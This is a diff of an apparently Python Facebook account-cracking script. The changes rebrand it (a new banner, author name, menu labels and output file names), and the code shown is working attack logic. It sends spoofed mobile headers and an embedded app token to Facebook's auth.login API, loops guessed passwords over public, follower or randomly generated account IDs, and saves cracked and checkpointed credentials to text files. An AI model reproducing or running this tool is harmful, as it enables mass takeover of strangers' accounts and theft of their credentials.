@@ -381,17 +381,24 @@ bd = random.randint(2e7, 3e7)
 sim = random.randint(2e4, 4e4)
 header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 logo ="""   
-   \033[1;96m   ___       __     __  
-   \033[1;96m    /   \     |  |    |  | 
-   \033[1;96m   /  ^  \    |  |    |  | 
-   \033[1;96m  /  /_\  \   |  |    |  | 
-   \033[1;96m /  _____  \  |  `----|  | 
-   \033[1;96m/__/     \__\ |_______|__| 
+   
+888    888 888     888 888b    888 88888888888 8888888888 8888888b.            
+888    888 888     888 8888b   888     888     888        888   Y88b           
+888    888 888     888 88888b  888     888     888        888    888           
+8888888888 888     888 888Y88b 888     888     8888888    888   d88P           
+888    888 888     888 888 Y88b888     888     888        8888888P"            
+888    888 888     888 888  Y88888     888     888        888 T88b             
+888    888 Y88b. .d88P 888   Y8888     888     888        888  T88b            
+888    888  "Y88888P"  888    Y888     888     8888888888 888   T88b 
+
+
+
+
    
 \033[1;92m︻╦デ╤━╼✿❯────「✿」───❏ ❐ ❑ ❒ ❏ ❐ ❏ ❐ ❑ ❒ ❏ ❐()==[:::::::::::::><::::::::::::::::[]==()
-\033[1;92m{~} \033[0;96mAuthor > \x1b[1;91mAli Abbas
-\033[1;92m{~} \033[0;96mFacebook > \x1b[1;91mAli Abbas
-\033[1;92m{~} \033[0;96mCreator > \x1b[1;91mAli Abbas
+\033[1;92m{~} \033[0;96mAuthor > \x1b[1;91mMR KASHIF
+\033[1;92m{~} \033[0;96mFacebook > \x1b[1;91mMR KASHIF
+\033[1;92m{~} \033[0;96mCreator > \x1b[1;91mMR KASHIF
 \033[1;92m︻╦デ╤━╼✿❯────「✿」───❏ ❐ ❑ ❒ ❏ ❐ ❏ ❐ ❑ ❒ ❏ ❐()==[:::::::::::::><::::::::::::::::[]==()"""
                    
 def main():
@@ -522,8 +529,8 @@ def menu():
     print("")
     print("")
     os.system('echo -e "-▄℠︻̷̿┻̿═━一◇●○◆○●◇●○◆○●◇╾━╤デ╦︻"| lolcat')
-    print(" \x1b[1;92m[1]  HACKALI AUTO PASS\n")
-    print(" \x1b[1;91m[2]  HACKALI CHOICE PASS\n")
+    print(" \x1b[1;92m[1]  HACKMAX AUTO PASS\n")
+    print(" \x1b[1;91m[2]  HACKMAX CHOICE PASS\n")
     print(' \x1b[1;90m[3]   BACK')
     os.system('echo -e "▄℠︻̷̿┻̿═━一◇●○◆○●◇●○◆○●◇╾━╤デ╦︻"| lolcat')
     print("")
@@ -556,8 +563,8 @@ def crack():
 	print("\t    \033[1;32mAUTO PASS CLONING\033[0;97m")
 	print("")
 	os.system('echo -e "▄℠︻̷̿┻̿═━一◇●○◆○●◇●○◆○●◇╾━╤デ╦︻"| lolcat')
-	print("\x1b[1;92m       [1] CRACKALI PUBLIC ID")
-	print("\x1b[1;92m       [2] CRACKALI FOLLOWERS")
+	print("\x1b[1;92m       [1] CRACKMAX PUBLIC ID")
+	print("\x1b[1;92m       [2] CRACKMAX FOLLOWERS")
 	print(" \x1b[1;92m      [0] BACK")
 	os.system('echo -e "▄℠︻̷̿┻̿═━一◇●○◆○●◇●○◆○●◇╾━╤デ╦︻"| lolcat')
 	print("")
@@ -908,15 +915,15 @@ def choice_select():
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 			q = json.loads(data)
 			if "access_token" in q:
-				print(" \033[1;32m [ALI DN] "+uid+" | "+pass1+"\033[0;97m")
-				ok = open("ALIdn.txt", "a")
+				print(" \033[1;32m [MAX DN] "+uid+" | "+pass1+"\033[0;97m")
+				ok = open("MAXdn.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;33m [ALI CP] "+uid+" | "+pass1+"\033[0;97m")
-					cp = open("ALIcp.txt", "a")
+					print(" \033[1;33m [MAX CP] "+uid+" | "+pass1+"\033[0;97m")
+					cp = open("MAXcp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
 					cps.append(uid+pass1)
@@ -924,15 +931,15 @@ def choice_select():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q:
-						print(" \033[1;32m [ALI DN] "+uid+" | "+pass2+"\033[0;97m")
-						ok = open("ALIdn.txt", "a")
+						print(" \033[1;32m [MAX DN] "+uid+" | "+pass2+"\033[0;97m")
+						ok = open("MAXdn.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;33m [ALI CP] "+uid+" | "+pass2+"\033[0;97m")
-							cp = open("ALIcp.txt", "a")
+							print(" \033[1;33m [MAX CP] "+uid+" | "+pass2+"\033[0;97m")
+							cp = open("MAXcp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
 							cps.append(uid+pass2)
@@ -940,15 +947,15 @@ def choice_select():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q:
-								print(" \033[1;32m [ALI DN] "+uid+" | "+pass3+"\033[0;97m")
-								ok = open("ALIdn.txt", "a")
+								print(" \033[1;32m [MAX DN] "+uid+" | "+pass3+"\033[0;97m")
+								ok = open("MAXdn.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print(" \033[1;33m [ALI CP] "+uid+" | "+pass3+"\033[0;97m")
-									cp = open("ALIcp.txt", "a")
+									print(" \033[1;33m [MAX CP] "+uid+" | "+pass3+"\033[0;97m")
+									cp = open("MAXcp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
 									cps.append(uid+pass3)
@@ -1000,15 +1007,15 @@ def ran():
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
 			q = json.loads(data)
 			if "access_token" in q:
-				print(" \033[1;32m[ALI DN] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
-				ok = open("ALIdn.txt", "a")
+				print(" \033[1;32m[MAX DN] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
+				ok = open("MAXdn.txt", "a")
 				ok.write(k+co+user+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;33m [ALI CP] "+k+co+user+" | "+pass1+"\033[0;97m")
-					cp = open("ALIcp.txt", "a")
+					print(" \033[1;33m [MAX CP] "+k+co+user+" | "+pass1+"\033[0;97m")
+					cp = open("MAXcp.txt", "a")
 					cp.write(k+co+user+"|"+pass1+"\n")
 					cp.close()
 					cps.append(k+co+user+pass1)
@@ -1017,15 +1024,15 @@ def ran():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
 					q = json.loads(data)
 					if "access_token" in q:
-						print(" \033[1;32m[ALI DN] "+k+co+user+" | "+q["uid"]+" | "+pass2+"\033[0;97m")
-						ok = open("ALIdn.txt", "a")
+						print(" \033[1;32m[MAX DN] "+k+co+user+" | "+q["uid"]+" | "+pass2+"\033[0;97m")
+						ok = open("MAXdn.txt", "a")
 						ok.write(k+co+user+"|"+pass2+"\n")
 						ok.close()
 						oks.append(k+co+user+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;33m [ALI CP] "+uid+" | "+pass2+"\033[0;97m")
-							cp = open("ALIcp.txt", "a")
+							print(" \033[1;33m [MAX CP] "+uid+" | "+pass2+"\033[0;97m")
+							cp = open("MAXcp.txt", "a")
 							cp.write(k+co+user+"|"+pass2+"\n")
 							cp.close()
 							cps.append(k+co+user+pass2)
@@ -1034,7 +1041,7 @@ def ran():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
 							q = json.loads(data)
 							if "access_token" in q:
-								print(" \033[1;32m[ALI DN] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
+								print(" \033[1;32m[MAX DN] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
 								ok = open("ALIdn.txt", "a")
 								ok.write(k+co+user+"|"+pass3+"\n")
 								ok.close()
